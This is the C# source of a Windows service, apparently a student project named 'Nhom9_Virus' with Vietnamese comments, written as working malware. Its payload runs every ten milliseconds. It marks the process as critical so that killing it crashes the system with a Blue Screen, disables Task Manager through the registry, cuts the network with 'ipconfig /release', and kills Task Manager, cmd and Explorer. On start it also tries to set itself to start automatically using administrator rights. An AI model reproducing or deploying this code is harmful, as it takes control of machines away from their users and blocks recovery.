using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
// Thu vien DLL
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Windows;

namespace Nhom9_Virus
{
    public partial class Service1 : ServiceBase
    {   

        private void DisconnectInternet()
        {
            ProcessStartInfo info = new ProcessStartInfo();
            info.FileName = "ipconfig";
            info.Arguments = "/release"; 
            info.WindowStyle = ProcessWindowStyle.Hidden;
            Process p = Process.Start(info);
            p.WaitForExit();
        }

        private void DeleteProcess()
        {
            Process[] p = Process.GetProcessesByName("taskmgr");
            if (p.Length > 0)
            {
                p[0].Kill();
            }
            Process[] p1 = Process.GetProcessesByName("cmd");
            if (p1.Length > 0)
            {
                p1[0].Kill();
            }
            Process[] p2 = Process.GetProcessesByName("explorer");
            if (p2.Length > 0)
            {
                p2[0].Kill();
            }
            Process[] p3 = Process.GetProcessesByName("services.msc");
            if (p3.Length > 0)
            {
                p3[0].Kill();
            }
        }

        // Import DLL: ntdll.dll - NtSetInformationProcess qua PInvoke - kích hoạt Blue Screen Of Death khi user cố gắng kill Virus này
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        
        public void Virus_payload_Load()
        {
            // chương trình quan trọng (critical)
            int isCritical = 1;
            // value cho BreakOnTermination (flag)
            int BreakOnTermination = 0x1D;

            // có được Debug Privileges (đặc quyền gỡ lỗi)
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            // tạo 1 subkey có tên là "rk" trong HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            // tạo data cho subkey -> tắt Task Manager
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
            // => đường dẫn registry được sử dụng để tắt Task Manager
            DisconnectInternet();
            DeleteProcess();

        }

        private string ExecuteCommandAsAdmin(string command)
        {

            ProcessStartInfo procStartInfo = new ProcessStartInfo()
            {
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                FileName = "runas.exe",
                Arguments = "/user:Administrator \"cmd /K " + command + "\""
            };

            using (Process proc = new Process())
            {
                proc.StartInfo = procStartInfo;
                proc.Start();

                string output = proc.StandardOutput.ReadToEnd();

                if (string.IsNullOrEmpty(output))
                    output = proc.StandardError.ReadToEnd();

                return output;
            }
        }


        Timer timer = new Timer(); // name space(using System.Timers;)
        public Service1()
        {
            InitializeComponent();
        }
        protected override void OnStart(string[] args)
        {


            // Ghi lên file
            WriteToFile("Service is started at " + DateTime.Now);
            // khởi tạo giá trị của biến "thời gian trôi qua"
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            // khởi tạo giá trị của biến "khoảng thời gian"
            timer.Interval = 10; //number in milisecinds
            // bật timer
            timer.Enabled = true;
            ExecuteCommandAsAdmin("sc config Nhom9_Virus start=auto");

        }
        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            Virus_payload_Load();

        }
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
            "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
            ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
        
    }
}